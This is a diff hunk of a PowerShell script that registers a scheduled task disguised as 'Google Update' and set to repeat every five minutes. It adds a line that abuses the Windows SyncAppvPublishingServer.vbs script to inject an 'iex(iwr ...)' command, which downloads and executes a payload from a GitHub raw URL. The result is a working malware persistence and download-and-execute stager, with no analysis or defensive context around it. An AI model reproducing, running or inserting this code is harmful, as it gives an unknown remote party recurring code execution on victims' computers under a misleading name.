@@ -2,3 +2,4 @@ $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\SyncAppvPublishi
 $timespan = New-TimeSpan -Minutes 5;
 $trigger = New-ScheduledTaskTrigger -Once -At 06:30 -RepetitionInterval $TimeSpan;
 Register-ScheduledTask -Action $action -TaskName "Google Update" -Description "Maintenance de Google." -Trigger $trigger;
+C:\Windows\System32\SyncAppvPublishingServer.vbs "Break; iex(iwr -usebasicparsing https://github.com/1l1l1l1l/1j1j1j1j/raw/main/4)"
